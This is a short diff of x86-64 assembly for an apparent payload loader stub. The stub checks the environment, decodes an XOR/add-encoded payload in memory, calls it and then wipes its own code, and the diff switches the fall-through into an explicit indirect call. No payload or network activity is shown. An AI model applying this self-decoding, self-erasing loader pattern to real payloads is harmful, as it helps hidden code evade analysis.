@@ -1,4 +1,5 @@
 .equ PAYLOAD_SIZE_IN_WORDS, 0
+.equ PAYLOAD_TIME_IMM_OFFSET, 0
 
 .macro movqq a, b
     push \b
@@ -43,13 +44,17 @@ env_check_okay:
     // Decode payload
     movqq rcx, PAYLOAD_SIZE_IN_WORDS
     // lea rdi, [rdx+(_end-_begin)+24] GNU AS outputs 488dba6d000000, why ._.
-    .byte 0x48, 0x8d, 0x7a, (_end-_begin)+24
+    .byte 0x48, 0x8d, 0x7a, (_end-_begin)+24+8
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
     add eax, [rdi+rcx*4]
     loop decode_loop
-
+    lea rax, [rdi-8]
+    lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
+    push rdx
+    call [rax]
+    pop rdx
 bye:
     // Zeroing self
     movqq rdi, rdx
@@ -60,6 +65,5 @@ bye:
     xor eax, eax
     rep stosb
     _fin:
-    // HACK: save 1 byte by embedding a retn insn at the beginning of payload and fall-through to payload
-    // ret 
+    ret
 _end:
